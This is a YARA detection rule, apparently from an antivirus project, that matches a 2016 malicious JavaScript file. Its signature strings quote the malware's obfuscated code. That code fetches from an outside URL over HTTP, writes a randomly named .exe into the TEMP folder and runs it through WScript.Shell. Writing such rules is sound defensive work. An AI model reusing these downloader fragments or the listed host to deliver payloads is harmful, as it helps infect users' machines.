rule sig_20160330_07322caefcd58530d5fc2e739804f387 {
  meta:
    description = "datamaliciousorder - file 20160330_07322caefcd58530d5fc2e739804f387.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ae2cbd798aedb46c44b8873d4c2d2f3ac2bdfabd53a46de8b6eafd8c58828aa6"

  strings:
    $s1  = "_R1[_SL](\"GET\", \"http://mentalmathcompetition.com/k4isa\", false);" fullword ascii
    $s2  = "function _KZ(_N2, _N3){_AI = _AI * 1; return _N2 - _N3;};" fullword ascii
    $s3  = "var _HR = function _LW() {return WScript[_VH](\"WScript\"+\".Shell\");}(), _A = 11;" fullword ascii
    $s4  = "if (_R1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _XZ(){return _BT + \"\";};" fullword ascii
    $s6  = "function _N() {return _HR[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"6I9lUxyXo.ex\" + \"e\";};" fullword ascii
    $s7  = "function _R() {return ((_N1 == true) && (_N1 == _T0)) ? 1 : _AI;};" fullword ascii
    $s8  = "function _IM(_G){_HR[\"Run\"](_G, _AI, _AI);};" fullword ascii
    $s9  = "var _AG = new this[\"Date\"]();" fullword ascii
    $s10 = "function _R0()" fullword ascii
    $s11 = " while (_CP){" fullword ascii
    $s12 = "function _RB(){return _VH;};" fullword ascii
    $s13 = "function _YY(){return 22;};" fullword ascii
    $s14 = "function _S(_X) {var _S0 = (1, 2, 3, 4, 5, _X); return _S0;};" fullword ascii
    $s15 = "return _KZ(_B0, _F);" fullword ascii
    $s16 = "var _N1 = false;" fullword ascii
    $s17 = "var _QJ = false;" fullword ascii
    $s18 = "var _T0 = false;" fullword ascii
    $s19 = "_N1 = true; " fullword ascii
    $s20 = "_T0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}